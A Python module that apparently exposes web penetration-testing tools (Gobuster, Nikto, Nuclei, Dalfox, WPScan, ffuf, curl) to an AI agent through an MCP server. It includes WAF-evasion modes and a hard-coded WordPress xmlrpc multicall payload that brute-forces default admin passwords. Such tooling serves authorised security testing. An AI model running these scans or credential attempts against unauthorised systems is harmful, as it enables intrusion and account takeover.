"""
Web analysis tools: directory/parameter fuzzing, crawling, vulnerability
scanning (Nikto, Nuclei, testssl, Dalfox), WordPress auditing, HTTP
utilities, and screenshot evidence capture.
"""

from __future__ import annotations

from typing import Any

from core.config import STEALTH_UA, mcp
from core.docker_exec import exec_in_kali


@mcp.tool()
def scan_directories_gobuster(
    target_url: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    extensions: str = "php,html,js,txt,bak,zip,env",
    evasion: bool = False,
) -> dict[str, Any]:
    """
    Enumerates hidden directories and files using Gobuster.
    Use after identifying HTTP/HTTPS ports in Nmap, before Nikto.

    Wordlists available in the container:
      /usr/share/wordlists/dirb/common.txt                           → fast
      /usr/share/wordlists/dirb/big.txt                              → medium
      /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   → thorough

    Args:
        target_url: Base URL. E.g.: "http://192.168.1.10", "https://app.local:8443"
        wordlist:   Path to the wordlist inside the container.
        extensions: Comma-separated extensions to test.
        evasion:    True = 5 threads + 300ms delay + real browser User-Agent.
                    Use when the target has a WAF or rate limiting.
    """
    cmd = [
        "gobuster", "dir",
        "-u", target_url,
        "-w", wordlist,
        "-x", extensions,
        "-q", "--no-error", "--timeout", "15s",
    ]
    if evasion:
        cmd += ["-t", "5", "--delay", "300ms", "-a", STEALTH_UA]
    else:
        cmd += ["-t", "20"]
    return exec_in_kali(cmd, tool_name="gobuster", target=target_url).model_dump()


@mcp.tool()
def crawl_application_katana(
    target_url: str,
    depth: int = 3,
    evasion: bool = False,
) -> dict[str, Any]:
    """
    Crawls the web application to discover endpoints and parameters using Katana.
    Use after Gobuster. URLs with parameters in the output are candidates for
    Dalfox and SQLMap.

    Args:
        target_url: Base URL. E.g.: "http://192.168.1.10"
        depth:      Crawl depth (1-5). Default: 3
        evasion:    True = 5 req/s rate limit + real browser headers.
    """
    if not 1 <= depth <= 5:
        raise ValueError("depth must be between 1 and 5")
    cmd = [
        "katana",
        "-u", target_url,
        "-d", str(depth),
        "-silent",
        "-jc",
        "-xhr",
        "-kf", "all",
        "-timeout", "30",
        "-retry", "2",
    ]
    if evasion:
        cmd += ["-rate-limit", "5", "-H", f"User-Agent: {STEALTH_UA}"]
    return exec_in_kali(cmd, tool_name="katana", target=target_url).model_dump()


@mcp.tool()
def scan_vulnerabilities_nikto(
    target_url: str,
    evasion: bool = False,
) -> dict[str, Any]:
    """
    Runs a web vulnerability scan using Nikto.
    Use once Nmap identifies open HTTP/HTTPS ports.

    Detects: exposed sensitive files, missing headers, dangerous HTTP methods,
    outdated versions, XSS/injection vectors, weak SSL/TLS.

    Args:
        target_url: Full URL. E.g.: "http://192.168.1.10", "https://app.local:8443"
        evasion:    True = browser User-Agent + 2s pause between tests.
    """
    cmd = [
        "nikto",
        "-h", target_url,
        "-nointeractive",
        "-maxtime", "180s",
    ]
    if evasion:
        cmd += ["-useragent", STEALTH_UA, "-pause", "2"]
    return exec_in_kali(cmd, tool_name="nikto", target=target_url).model_dump()


@mcp.tool()
def scan_ssl_testssl(target: str, port: int = 443) -> dict[str, Any]:
    """
    Analyzes SSL/TLS configuration using testssl.sh.
    Use when Nmap identifies port 443 or another HTTPS service.

    Detects: weak protocols (SSLv2/v3, TLS 1.0/1.1), weak ciphers,
    BEAST/POODLE/HEARTBLEED, invalid/expired certificates, missing HSTS.

    Args:
        target: IP or hostname. E.g.: "192.168.1.10", "app.example.com"
        port:   HTTPS port. Default: 443
    """
    cmd = [
        "testssl.sh",
        "--quiet",
        "--color", "0",
        "--fast",
        f"{target}:{port}",
    ]
    return exec_in_kali(cmd, tool_name="testssl", target=target).model_dump()


@mcp.tool()
def scan_nuclei(
    target_url: str,
    severity: str = "medium,high,critical",
    tags: str = "",
) -> dict[str, Any]:
    """
    Detects CVEs and known vulnerabilities via templates using Nuclei.
    Use after Nikto to cover specific CVEs based on identified versions.

    Args:
        target_url: Target URL. E.g.: "http://192.168.1.10"
        severity:   Severity filter. E.g.: "high,critical" | "medium,high,critical"
        tags:       Template tags to filter by. E.g.: "wordpress", "apache", "xss,sqli"
                    Leave empty to use all templates for the given severity.
    """
    cmd = [
        "nuclei",
        "-u", target_url,
        "-severity", severity,
        "-silent",
        "-no-color",
        "-timeout", "10",
        "-rate-limit", "20",
        "-H", f"User-Agent: {STEALTH_UA}",
    ]
    if tags:
        cmd += ["-tags", tags]
    return exec_in_kali(cmd, tool_name="nuclei", target=target_url).model_dump()


@mcp.tool()
def scan_xss_dalfox(target_url: str) -> dict[str, Any]:
    """
    Tests for Cross-Site Scripting (XSS) using Dalfox.
    Use when the URL contains GET parameters or Katana discovers forms.

    Detects: Reflected XSS, DOM XSS, WAF filter bypass.

    Args:
        target_url: URL with parameters. E.g.: "http://app.local/search?q=test"
    """
    cmd = [
        "dalfox",
        "url", target_url,
        "--no-color",
        "--silence",
        "--timeout", "30",
        "--worker", "10",
    ]
    return exec_in_kali(cmd, tool_name="dalfox", target=target_url).model_dump()


@mcp.tool()
def scan_wordpress_wpscan(
    target_url: str,
    enumerate: str = "vp,vt,u",
    aggressive: bool = False,
) -> dict[str, Any]:
    """
    Runs a full WordPress audit using WPScan.
    Use when a WordPress site is identified (wp-login.php, wp-content/ in Gobuster/Nikto).

    Detects: vulnerable plugins and themes, enumerated users, weak passwords,
    enabled xmlrpc, insecure configurations, exposed backups.

    Args:
        target_url:  WordPress URL. E.g.: "http://192.168.1.10", "http://vulnwp-app:8080"
        enumerate:   What to enumerate. Default: "vp,vt,u" (vulnerable plugins, themes, users).
                     Options: "vp" vuln plugins, "ap" all plugins, "vt" vuln themes,
                              "at" all themes, "u" users, "cb" config backups, "dbe" DB exports
        aggressive:  True = aggressive mode (more thorough, slower and noisier).
    """
    cmd = [
        "wpscan",
        "--url", target_url,
        "--no-banner",
        "--no-update",
        "--disable-tls-checks",
        "--format", "cli-no-colour",
        "--enumerate", enumerate,
    ]
    if aggressive:
        cmd += ["--plugins-detection", "aggressive", "--themes-detection", "aggressive"]
    else:
        cmd += ["--plugins-detection", "passive"]

    return exec_in_kali(cmd, tool_name="wpscan", target=target_url).model_dump()


@mcp.tool()
def make_http_request(
    url: str,
    method: str = "GET",
    headers: str = "",
    body: str = "",
    follow_redirects: bool = True,
    timeout: int = 15,
) -> dict[str, Any]:
    """
    Makes a custom HTTP request to check content, headers, or test payloads.
    Use to confirm exposed files (.env, phpinfo.php, backups), inspect endpoint
    responses, or send manual payloads during evidence verification.

    Args:
        url:               Full URL. E.g.: "http://192.168.1.10/.env"
        method:            HTTP method. Default: "GET". Others: "POST", "HEAD", "PUT"
        headers:           Extra headers, one per line.
                           E.g.: "Authorization: Bearer token\\nX-Custom: value"
        body:              Request body (for POST/PUT). E.g.: "user=admin&pass=test"
        follow_redirects:  Follow redirects. Default: True
        timeout:           Timeout in seconds. Default: 15
    """
    cmd = [
        "curl", "-s", "-i",
        "-X", method.upper(),
        "--max-time", str(timeout),
    ]
    if follow_redirects:
        cmd += ["-L"]
    for h in headers.splitlines():
        h = h.strip()
        if h:
            cmd += ["-H", h]
    if body:
        cmd += ["-d", body]
    cmd.append(url)
    return exec_in_kali(cmd, tool_name="curl", target=url).model_dump()


@mcp.tool()
def check_security_headers(target_url: str) -> dict[str, Any]:
    """
    Analyzes HTTP security headers and cookie flags for the target.
    Returns a structured analysis: present, missing, or misconfigured headers,
    with severity (high/medium/low) for each finding.

    Checks: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options,
    Strict-Transport-Security, Referrer-Policy, Permissions-Policy,
    CORS (Access-Control-Allow-Origin), cookies (HttpOnly, Secure, SameSite).

    Args:
        target_url: Target URL. E.g.: "http://192.168.1.10", "https://app.local"
    """
    cmd = ["curl", "-s", "-I", "-L", "--max-time", "10", target_url]
    result = exec_in_kali(cmd, tool_name="curl", target=target_url)

    headers: dict[str, str] = {}
    for line in result.output.splitlines():
        if ":" in line and not line.lower().startswith("http/"):
            key, _, val = line.partition(":")
            headers[key.strip().lower()] = val.strip()

    _SECURITY_HEADERS: dict[str, str] = {
        "content-security-policy":   "high",
        "x-frame-options":           "medium",
        "x-content-type-options":    "medium",
        "strict-transport-security": "high",
        "referrer-policy":           "low",
        "permissions-policy":        "low",
    }

    findings = []
    for header, severity in _SECURITY_HEADERS.items():
        value = headers.get(header)
        findings.append({
            "header":   header,
            "status":   "present" if value else "missing",
            "value":    value,
            "severity": "info" if value else severity,
            "detail":   "OK" if value else f"{header} not configured",
        })

    cors = headers.get("access-control-allow-origin")
    if cors == "*":
        findings.append({
            "header": "access-control-allow-origin", "status": "misconfigured",
            "value": cors, "severity": "high",
            "detail": "CORS wildcard — any origin can make authenticated requests",
        })
    elif cors:
        findings.append({
            "header": "access-control-allow-origin", "status": "present",
            "value": cors, "severity": "info",
            "detail": "CORS with a specific origin",
        })

    cookie_issues = []
    for line in result.output.splitlines():
        if line.lower().startswith("set-cookie:"):
            cookie_val = line[11:].strip()
            low = cookie_val.lower()
            issues = []
            if "httponly" not in low:
                issues.append("Missing HttpOnly — accessible via JS (XSS risk)")
            if "secure" not in low:
                issues.append("Missing Secure — sent over unencrypted HTTP")
            if "samesite" not in low:
                issues.append("Missing SameSite — vulnerable to CSRF")
            if issues:
                cookie_issues.append({"cookie": cookie_val[:100], "issues": issues})

    high   = sum(1 for f in findings if f["severity"] == "high")
    medium = sum(1 for f in findings if f["severity"] == "medium")

    return {
        "tool":             "curl-headers",
        "target":           target_url,
        "exit_code":        result.exit_code,
        "success":          result.success,
        "raw_headers":      result.output,
        "security_headers": findings,
        "cookie_issues":    cookie_issues,
        "summary": {
            "high":         high,
            "medium":       medium,
            "total_issues": high + medium + len(cookie_issues),
        },
    }


@mcp.tool()
def check_exposed_files(
    target_url: str,
    evasion: bool = False,
) -> dict[str, Any]:
    """
    Checks for exposure of sensitive files and directories using Gobuster with a
    dedicated wordlist.

    Detects: .env, wp-config.php.bak, phpinfo.php, backup.zip, .git/, debug.log,
    composer.json, secrets.yml, database.sql, and dozens of other critical files.
    Use right after standard Gobuster for targeted leak coverage.

    Args:
        target_url: Base URL of the target. E.g.: "http://192.168.1.10", "http://vulnwp-app:8080"
        evasion:    True = 3 threads + 500ms delay + real User-Agent. Use on sites with a WAF.
    """
    cmd = [
        "gobuster", "dir",
        "-u", target_url,
        "-w", "/usr/share/wordlists/sensitive-paths.txt",
        "-q", "--no-error", "--timeout", "15s",
    ]
    if evasion:
        cmd += ["-t", "3", "--delay", "500ms", "-a", STEALTH_UA]
    else:
        cmd += ["-t", "10"]
    return exec_in_kali(cmd, tool_name="gobuster", target=target_url).model_dump()


@mcp.tool()
def scan_fuzzing_ffuf(
    target_url: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    param_name: str = "",
    method: str = "GET",
    match_codes: str = "200,301,302,403",
    filter_size: str = "",
    evasion: bool = False,
) -> dict[str, Any]:
    """
    Fast fuzzing using ffuf. Faster and more flexible than gobuster.
    Supports directory fuzzing, GET/POST parameters, and REST API endpoints.

    Modes:
      Directories: target_url="http://app/FUZZ"  (put FUZZ directly in the URL)
      Parameters:  target_url="http://app/page" + param_name="id"  → generates ?id=FUZZ
      POST body:   method="POST" + param_name="username"

    Wordlists available:
      /usr/share/wordlists/dirb/common.txt                          → fast, general
      /usr/share/wordlists/dirb/big.txt                             → broad
      /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  → thorough
      /usr/share/wordlists/sensitive-paths.txt                      → sensitive files

    Args:
        target_url:   URL with FUZZ embedded, or base URL when param_name is given.
        wordlist:     Path to the wordlist inside the container.
        param_name:   Parameter to fuzz. Generates ?param=FUZZ (GET) or body param=FUZZ (POST).
        method:       HTTP method. Default: "GET"
        match_codes:  Status codes to report. Default: "200,301,302,403"
        filter_size:  Filter out responses of this exact size (bytes).
                      Use to hide a custom default 404 response.
        evasion:      True = 5 threads + 10 req/s rate limit + 200ms delay + real User-Agent.
                      Use when the target has a WAF or rate limiting.
    """
    if param_name:
        if method.upper() == "POST":
            fuzz_url  = target_url
            post_data = f"{param_name}=FUZZ"
        else:
            sep      = "&" if "?" in target_url else "?"
            fuzz_url = f"{target_url}{sep}{param_name}=FUZZ"
            post_data = ""
    else:
        fuzz_url  = target_url if "FUZZ" in target_url else f"{target_url}/FUZZ"
        post_data = ""

    cmd = [
        "ffuf",
        "-u", fuzz_url,
        "-w", wordlist,
        "-mc", match_codes,
        "-timeout", "10",
        "-noninteractive",
        "-s",
    ]
    if evasion:
        cmd += ["-t", "5", "-rate", "10", "-p", "0.2", "-H", f"User-Agent: {STEALTH_UA}"]
    elif filter_size == "" and not param_name:
        cmd += ["-t", "20"]
    else:
        cmd += ["-t", "20"]

    if method.upper() == "POST":
        cmd += ["-X", "POST", "-d", post_data]
    if filter_size:
        cmd += ["-fs", filter_size]

    return exec_in_kali(cmd, tool_name="ffuf", target=target_url).model_dump()


@mcp.tool()
def scan_xmlrpc_wordpress(target_url: str) -> dict[str, Any]:
    """
    Tests the WordPress xmlrpc.php endpoint for attack vectors.
    Use when WPScan or Nikto reports xmlrpc.php as accessible.

    Tests:
      - Existence and reachability of xmlrpc.php
      - Method enumeration via system.listMethods
      - Brute force via system.multicall — bypasses rate limiting (thousands of logins per request)
      - Credential confirmation via wp.getUsersBlogs

    Args:
        target_url: Base WordPress URL. E.g.: "http://192.168.1.10:8080"
    """
    xmlrpc_url = target_url.rstrip("/") + "/xmlrpc.php"
    results: dict[str, Any] = {"target": target_url, "xmlrpc_url": xmlrpc_url, "phases": {}}

    # 1. Check existence
    check = exec_in_kali(
        ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", xmlrpc_url],
        tool_name="curl", target=target_url,
    )
    http_code = check.output.strip()
    results["phases"]["existence"] = {"http_code": http_code, "accessible": http_code in ("200", "405")}

    if http_code not in ("200", "405"):
        results["accessible"] = False
        results["summary"]    = f"xmlrpc.php not accessible (HTTP {http_code})."
        return results

    results["accessible"] = True

    # 2. Enumerate available methods
    list_methods_xml = (
        "<?xml version='1.0'?>"
        "<methodCall><methodName>system.listMethods</methodName><params/></methodCall>"
    )
    methods = exec_in_kali(
        ["curl", "-s", "-X", "POST", "-H", "Content-Type: text/xml", "-d", list_methods_xml, xmlrpc_url],
        tool_name="curl", target=target_url,
    )
    results["phases"]["list_methods"] = {"output": methods.output[:3000]}

    # 3. Multicall brute force with common credentials (3 attempts)
    multicall_xml = (
        "<?xml version='1.0'?><methodCall><methodName>system.multicall</methodName>"
        "<params><param><value><array><data>"
        "<value><struct>"
        "<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>"
        "<member><name>params</name><value><array><data>"
        "<value><string>admin</string></value><value><string>admin</string></value>"
        "</data></array></value></member></struct></value>"
        "<value><struct>"
        "<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>"
        "<member><name>params</name><value><array><data>"
        "<value><string>admin</string></value><value><string>password123</string></value>"
        "</data></array></value></member></struct></value>"
        "<value><struct>"
        "<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>"
        "<member><name>params</name><value><array><data>"
        "<value><string>admin</string></value><value><string>123456</string></value>"
        "</data></array></value></member></struct></value>"
        "</data></array></value></param></params></methodCall>"
    )
    multicall = exec_in_kali(
        ["curl", "-s", "-X", "POST", "-H", "Content-Type: text/xml", "-d", multicall_xml, xmlrpc_url],
        tool_name="curl", target=target_url,
    )
    results["phases"]["multicall"] = {"output": multicall.output[:3000]}

    auth_ok = any(k in multicall.output for k in ("isAdmin", "blogName", "blogid"))
    results["auth_bypass_found"] = auth_ok
    results["summary"] = (
        "CRITICAL: Valid credentials confirmed via xmlrpc multicall!" if auth_ok
        else "xmlrpc.php exposed. Methods enumerated. None of the 3 test credentials confirmed a login."
    )
    return results


@mcp.tool()
def screenshot_gowitness(target_url: str) -> dict[str, Any]:
    """
    Captures a screenshot of the web application to document evidence using Gowitness.
    Screenshots are saved to /tmp/gowitness/ inside the container.

    Args:
        target_url: URL to capture. E.g.: "http://192.168.1.10/admin"
    """
    cmd = [
        "gowitness",
        "scan", "single",
        "--url", target_url,
        "--screenshot-path", "/tmp/gowitness/",
        "--write-none",
    ]
    return exec_in_kali(cmd, tool_name="gowitness", target=target_url).model_dump()
